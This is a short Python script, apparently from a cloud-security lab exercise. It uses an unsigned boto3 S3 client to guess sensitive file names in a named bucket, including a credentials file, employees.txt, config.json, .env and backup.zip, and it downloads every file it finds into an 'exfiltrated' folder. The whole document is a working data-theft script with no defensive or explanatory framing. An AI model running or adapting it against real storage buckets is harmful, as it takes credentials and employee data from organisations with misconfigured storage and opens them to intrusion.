import boto3 
from botocore import UNSIGNED 
from botocore.config import Config
client = boto3.client('s3', config=Config(signature_version=UNSIGNED))
guessed_files=["credntials.txt", "employees.txt", "config.json", ".env", "backup.zip"]
for file in guessed_files:
    try:
        client.download_file('cloud-security-lab-vulnerable-saron', file, f"exfiltrated/{file}")
        print(f"SUCCESS: Found and downloaded {file}")
    except Exception as e:
        print(f"failed: {file} doesn't exist - {e}")